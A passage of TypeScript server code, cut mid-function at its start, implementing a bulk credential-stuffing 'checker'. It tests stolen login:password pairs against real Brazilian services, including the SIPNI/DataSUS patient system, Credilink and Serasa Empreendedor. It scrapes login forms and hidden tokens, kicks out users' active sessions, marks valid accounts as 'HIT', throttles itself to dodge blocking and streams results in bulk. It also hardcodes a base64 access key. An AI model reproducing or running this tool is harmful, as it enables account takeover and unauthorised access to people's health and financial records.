      return { credential, login, status: "ERROR", detail: `AJAX2_ERROR:${String(e)}` };
    }

    const xml2 = post2.body;

    // Detect wrong credentials (sometimes appears in step 2 as well)
    if (xml2.toLowerCase().includes("usu") && xml2.toLowerCase().includes("ou senha inv")) {
      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos_step2" };
    }

    // Extract redirect URL from XML: <redirect url="..."></redirect>
    const redirectMatch = xml2.match(/<redirect\s+url="([^"]+)"><\/redirect>/);
    const redirectUrl   = redirectMatch
      ? (redirectMatch[1].startsWith("/")
          ? `https://sipni.datasus.gov.br${redirectMatch[1]}`
          : redirectMatch[1])
      : null;

    if (!redirectUrl) {
      // No redirect in XML — might still be an inline failure
      const xml2Low = xml2.toLowerCase();
      if (xml2Low.includes("inicio.jsf") || xml2Low.includes("type=\"password\"") || xml2Low.includes("j_idt23:senha")) {
        return { credential, login, status: "FAIL", detail: "no_redirect_still_on_login" };
      }
      // Ambiguous — fall through to pacientes check
    }

    // ── Step 4: Verify access via pacientes page ──────────────────────────────
    // If we got a redirect URL that's not the login page, follow it
    // Then hit the pacientes URL to confirm session
    const targetUrl = redirectUrl && !redirectUrl.includes("inicio.jsf") ? redirectUrl : SIPNI_PACIENTES;
    let finalResult: CurlResult;
    try {
      finalResult = await runCurl([
        "-k", "-s",
        "-b", cookieFile,
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-L",          // follow redirects
        "--max-redirs", "5",
        targetUrl,
      ], SIPNI_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `FINAL_GET_ERROR:${String(e)}` };
    }

    const finalText = finalResult.body.toLowerCase();

    // LIVE markers
    const liveMarkers = ["pacienteform", "pesquisa de paciente", "listapacientetable",
                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente"];
    for (const m of liveMarkers) {
      if (finalText.includes(m)) {
        return { credential, login, status: "HIT", detail: "sipni_dashboard" };
      }
    }

    // Heuristic: page is large and doesn't look like the login screen → likely a valid session
    if (finalResult.body.length > 5000 && !finalText.includes("type=\"password\"") && !finalText.includes("inicio.jsf")) {
      return { credential, login, status: "HIT", detail: "large_page_no_login_form" };
    }

    // DIE markers
    const dieMarkers = ["usuário ou senha inválidos", "senha incorreta", "sua sessão expirou",
                        "efetue o login", "problemas para se logar?", "j_idt23:senha", "j_idt26:senha"];
    for (const m of dieMarkers) {
      if (finalText.includes(m)) return { credential, login, status: "FAIL", detail: `die_marker:${m.slice(0,30)}` };
    }

    if (finalText.includes("type=\"password\"") || finalText.includes("inicio.jsf")) {
      return { credential, login, status: "FAIL", detail: "redirected_to_login" };
    }

    if (finalResult.body.length < 1000) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "no_markers_found" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CREDILINK CHECKER — app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net
//  Logic: POST JSON → check idToken in response
//         Handle "UserHasSessionActive" by invalidating old session first.
// ═══════════════════════════════════════════════════════════════════════════════
const CREDILINK_AUTH_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate";
const CREDILINK_BASE_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net";
const CREDILINK_TIMEOUT  = 20_000;
const CREDILINK_PRODUCT  = "84";
const CREDILINK_KEY      = "YXRlbmFAcm9vdDphdGVuYUBCUTJhSiM2VEIyaWI=";

async function checkCrediLink(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({
    login,
    password,
    productId:  CREDILINK_PRODUCT,
    accessKey:  CREDILINK_KEY,
    ip:         "0.0.0.0",
  });

  const attempt = async (): Promise<CurlResult> => runCurl([
    "-k", "-s",
    "-X", "POST",
    "-H", "Content-Type: application/json",
    "-H", `User-Agent: ${DESKTOP_UA}`,
    "-d", body,
    CREDILINK_AUTH_URL,
  ], CREDILINK_TIMEOUT);

  try {
    let result = await attempt();

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(result.body.trim()); }
    catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // Handle "UserHasSessionActive" — invalidate old session then retry
    const details = Array.isArray(json.details) ? json.details as Record<string, unknown>[] : [];
    if (details[0]?.detailedMessage === "UserHasSessionActive") {
      const action = details[0]?.action as Record<string, string> | undefined;
      const href   = action?.href;
      const tk     = action?.temporaryToken;
      if (href && tk) {
        // Invalidate session
        await runCurl([
          "-k", "-s",
          "-X", "POST",
          "-H", `Authorization: Bearer ${tk}`,
          "-H", `User-Agent: ${DESKTOP_UA}`,
          `${CREDILINK_BASE_URL}/credicorp/api${href}`,
        ], CREDILINK_TIMEOUT).catch(() => void 0);
        // Retry auth
        result = await attempt();
        try { json = JSON.parse(result.body.trim()); }
        catch { return { credential, login, status: "ERROR", detail: "RETRY_INVALID_JSON" }; }
      }
    }

    // HIT: token received
    const idToken = json.idToken;
    if (idToken && typeof idToken === "string" && idToken.length > 0) {
      return { credential, login, status: "HIT", detail: "token_ok" };
    }

    // Common error codes
    const msg = String(json.message ?? json.erro ?? json.status ?? "").toLowerCase();
    if (msg.includes("invalid") || msg.includes("inválid") || msg.includes("incorret") || result.statusCode === 401) {
      return { credential, login, status: "FAIL", detail: `auth_failed:${msg.slice(0, 60)}` };
    }

    if (result.statusCode === 400 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: `http_${result.statusCode}:${msg.slice(0, 60)}` };
    }

    return { credential, login, status: "FAIL", detail: result.body.trim().slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `CREDILINK_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERASA EMPREENDEDOR CHECKER — https://www.serasaempreendedor.com.br/login
//  Original Python checker used Selenium (headless Chrome) because the main
//  Serasa page is a React SPA. HOWEVER, the OAuth redirect chain ends at the
//  identity-provider login page which IS server-rendered HTML (Keycloak/SSO).
//  Strategy:
//    Step 1: GET /login → follow ALL redirects → land on SSO HTML form page
//    Step 2: Extract form action URL + any hidden tokens from SSO HTML
//    Step 3: POST credentials to the form action URL (SSO server-side)
//    Step 4: Follow post-login redirects → detect dashboard vs error page
// ═══════════════════════════════════════════════════════════════════════════════
const SERASA_URL     = "https://www.serasaempreendedor.com.br/login";
const SERASA_TIMEOUT = 30_000;

async function checkSerasa(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/serasa_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, follow all SSO redirects ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "12",
        "-c", cookieFile, "-b", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: none",
        SERASA_URL,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html = getResult.body;

    // ── Detect if we have a server-rendered login form (SSO/Keycloak) ─────────
    const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
                             html.includes("id='username'") || html.includes("name='username'");
    const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");

    if (!hasUsernameField || !hasPasswordField) {
      // The page is still a JS-only SPA at this point — Selenium would be needed
      return { credential, login, status: "ERROR", detail: "SELENIUM_REQUIRED:js_only_login" };
    }

    // ── Extract the form action URL (Keycloak uses absolute URLs here) ────────
    const formActionMatch =
      html.match(/<form[^>]+action=["']([^"']+)["']/i) ||
      html.match(/action=["']([^"']+)["'][^>]*method=["']post["']/i);

    let formAction = formActionMatch?.[1] ?? "";
    if (!formAction) {
      return { credential, login, status: "ERROR", detail: "NO_FORM_ACTION" };
    }
    // Decode HTML entities (&amp; → &)
    formAction = formAction.replace(/&amp;/g, "&");
    // Resolve relative form action using the SSO domain from a known redirect pattern
    if (!formAction.startsWith("http")) {
      const ssoBase = getResult.headers["content-location"] ??
                      "https://www.serasaempreendedor.com.br";
      formAction = `${ssoBase.replace(/\/$/, "")}${formAction.startsWith("/") ? "" : "/"}${formAction}`;
    }

    // ── Extract hidden tokens (Keycloak session code, execution, etc.) ────────
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /<input[^>]+type=["']hidden["'][^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(html)) !== null) {
      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
      if (nameM) hiddenInputs[nameM[1]] = valueM?.[1] ?? "";
    }

    // ── Step 2: POST credentials to SSO form action ───────────────────────────
    const postFields: Record<string, string> = {
      ...hiddenInputs,
      username: login,
      password,
      credentialId: "",
    };
    const postBody = Object.entries(postFields)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-k", "--compressed", "-L", "--max-redirs", "10",
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `Referer: ${formAction}`,
        "-H", "Origin: https://www.serasaempreendedor.com.br",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9",
        "-H", "Sec-Fetch-Dest: document",
        "-H", "Sec-Fetch-Mode: navigate",
        "-H", "Sec-Fetch-Site: same-origin",
        "--data-raw", postBody,
        formAction,
      ], SERASA_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    // ── HIT markers (post-login dashboard) ────────────────────────────────────
    if (bLow.includes("bem-vindo ao nosso tour") || bLow.includes("comprar créditos") ||
        bLow.includes("comprar creditos") || bLow.includes("meu perfil") ||
        bLow.includes("consultas realizadas") || bLow.includes("créditos disponíveis") ||
        bLow.includes("saldo disponível") || bLow.includes("painel")) {
      return { credential, login, status: "HIT", detail: "serasa_dashboard" };
    }

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (bLow.includes("verifique se o usu") || bLow.includes("senha foram digitados") ||
        bLow.includes("usuário ou senha incorretos") || bLow.includes("credenciais inválidas") ||
        bLow.includes("invalid credentials") || bLow.includes("invalid_grant") ||
        bLow.includes("account is disabled") || bLow.includes("user not found")) {
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    }

    // ── Still on SSO login page (wrong creds but no explicit message) ─────────
    if ((bLow.includes('id="username"') || bLow.includes("name=\"username\"")) &&
        bLow.includes('type="password"')) {
      return { credential, login, status: "FAIL", detail: "still_on_login_page" };
    }

    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "response_too_short" };
    }

    return { credential, login, status: "FAIL", detail: "unknown_response" };
  } finally {
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ── Runner ────────────────────────────────────────────────────────────────────
const CONCURRENCY: Record<CheckerTarget, number> = {
  datasus:       2,
  iseek:         2,
  sipni:         2,   // 4-step AJAX — conservative
  consultcenter: 3,
  mind7:         3,
  serpro:        4,   // lightweight JSON API
  sisreg:        2,   // HTML-heavy, slow server
  credilink:     4,   // JSON API — fast
  serasa:        2,   // heavy SPA — conservative
};

function resolveChecker(target: CheckerTarget) {
  switch (target) {
    case "datasus":       return checkDataSUS;
    case "sipni":         return checkSipni;
    case "consultcenter": return checkConsultCenter;
    case "mind7":         return checkMind7;
    case "serpro":        return checkSerpro;
    case "sisreg":        return checkSisreg;
    case "credilink":     return checkCrediLink;
    case "serasa":        return checkSerasa;
    default:              return checkIseek;
  }
}

async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
  const checker     = resolveChecker(target);
  const concurrency = CONCURRENCY[target];

  const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);

  return {
    total:   results.length,
    hits:    results.filter(r => r.status === "HIT").length,
    fails:   results.filter(r => r.status === "FAIL").length,
    errors:  results.filter(r => r.status === "ERROR").length,
    results,
  };
}

// ── Routes ────────────────────────────────────────────────────────────────────
// POST /api/checker/check
// body: { credentials: string[], target: "iseek" | "datasus" }
// body: { login: string, password: string, target: "iseek" | "datasus" }
router.post("/checker/check", async (req, res): Promise<void> => {
  const { credentials, login, password, target = "iseek" } = req.body as {
    credentials?: string[];
    login?:       string;
    password?:    string;
    target?:      CheckerTarget;
  };

  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
  if (!validTargets.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa" });
    return;
  }

  let pairs: Array<{ login: string; password: string }> = [];
  if (login && password) {
    pairs = [{ login: login.trim(), password: String(password).trim() }];
  } else if (Array.isArray(credentials)) {
    pairs = parseCredentials(credentials.join("\n"));
  } else {
    res.status(400).json({ error: "Provide { credentials: string[] } or { login, password }" });
    return;
  }

  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials found" });
    return;
  }

  const response = await runBulk(pairs, target);
  res.json(response);
});

// POST /api/checker/stream  — Server-Sent Events, sends each result as it completes
// Body: { credentials: string[], target: CheckerTarget }
// Events:
//   { type:"start",  total }
//   { type:"result", ...CheckResult, index, total, hits, fails, errors, retries, wasRetried }
//   { type:"done",   total, hits, fails, errors, retries, elapsedMs, credsPerMin }
router.post("/checker/stream", async (req, res): Promise<void> => {
  const { credentials, target = "iseek" } = req.body as {
    credentials?: string[];
    target?:      CheckerTarget;
  };

  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
  if (!validTargets.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "Invalid target" });
    return;
  }

  if (!Array.isArray(credentials) || credentials.length === 0) {
    res.status(400).json({ error: "credentials required" });
    return;
  }

  const pairs = parseCredentials(credentials.join("\n"));
  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials" });
    return;
  }

  // ── SSE setup ─────────────────────────────────────────────────────────────
  res.setHeader("Content-Type",      "text/event-stream");
  res.setHeader("Cache-Control",     "no-cache, no-transform");
  res.setHeader("Connection",        "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  let clientGone = false;
  req.on("close", () => { clientGone = true; });

  const send = (data: object) => {
    if (!res.writableEnded && !clientGone) res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  let hits = 0, fails = 0, errors = 0, retries = 0;
  let consecutiveErrors = 0;
  const total     = pairs.length;
  const startedAt = Date.now();

  send({ type: "start", total });

  const checker     = resolveChecker(target);
  const concurrency = CONCURRENCY[target];

  type CheckResultEx = CheckResult & { wasRetried: boolean };

  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CheckResultEx> => {
    if (clientGone) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };

    // ── Adaptive rate-limit back-off ─────────────────────────────────────────
    // If last N checks were all ERRORs (network/timeout), slow down to avoid
    // hammering the target and getting harder-blocked.
    if (consecutiveErrors >= 3) {
      const delay = Math.min(consecutiveErrors * 400, 4_000);
      await sleep(delay);
    }

    // ── First attempt ────────────────────────────────────────────────────────
    let result = await checker(login, password);
    let wasRetried = false;

    // ── Auto-retry once on ERROR (network/timeout/5xx) ───────────────────────
    if (result.status === "ERROR") {
      await sleep(800);
      const retry = await checker(login, password);
      if (retry.status !== "ERROR") {
        result     = retry;
        wasRetried = true;
      }
    }

    // ── Track consecutive error streak ───────────────────────────────────────
    if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
    else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);

    return { ...result, wasRetried };
  };

  await pMap(
    pairs,
    mapper,
    concurrency,
    (result: CheckResultEx, index: number) => {
      if (result.status === "HIT")        hits++;
      else if (result.status === "FAIL")  fails++;
      else                                errors++;
      if (result.wasRetried) retries++;
      send({ type: "result", ...result, index, total, hits, fails, errors, retries });
    },
  );

  const elapsedMs   = Date.now() - startedAt;
  const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
  send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
  res.end();
});

export default router;
